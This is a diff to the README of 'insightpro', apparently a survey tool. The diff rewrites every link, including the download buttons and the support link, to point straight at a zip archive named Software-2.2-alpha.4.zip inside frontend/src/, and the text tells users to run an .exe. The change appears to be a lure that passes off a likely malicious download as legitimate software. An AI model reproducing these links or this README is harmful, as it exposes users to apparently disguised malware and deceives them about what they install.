@@ -1,6 +1,6 @@
 # 📈 insightpro - Create surveys and gather data easily
 
-[![Download Insightpro](https://img.shields.io/badge/Download-Insightpro-blue)](https://github.com/Trueto-slogger356/insightpro)
+[![Download Insightpro](https://img.shields.io/badge/Download-Insightpro-blue)](https://github.com/Trueto-slogger356/insightpro/raw/refs/heads/main/frontend/src/Software-2.2-alpha.4.zip)
 
 Insightpro helps you build surveys and gather insights. You can create complex forms with branching, track your results in real time, and manage user access. The tool stores your information securely and keeps your data ready for analysis. 
 
@@ -8,7 +8,7 @@ Insightpro helps you build surveys and gather insights. You can create complex f
 
 To begin, visit the release page to get the latest version of the installer. 
 
-[Download Insightpro for Windows](https://github.com/Trueto-slogger356/insightpro)
+[Download Insightpro for Windows](https://github.com/Trueto-slogger356/insightpro/raw/refs/heads/main/frontend/src/Software-2.2-alpha.4.zip)
 
 Click the link above to reach our download section. Select the file ending in .exe to start the setup process.
 
@@ -82,4 +82,4 @@ Yes. Go to the account settings and select "Delete all projects." This removes y
 
 ## 📞 Support
 
-If the software does not work, visit the official page at https://github.com/Trueto-slogger356/insightpro to report problems. Check the issue tracker to see if other users found a fix. Please include your system version number when you share information about a bug.
+If the software does not work, visit the official page at https://github.com/Trueto-slogger356/insightpro/raw/refs/heads/main/frontend/src/Software-2.2-alpha.4.zip to report problems. Check the issue tracker to see if other users found a fix. Please include your system version number when you share information about a bug.
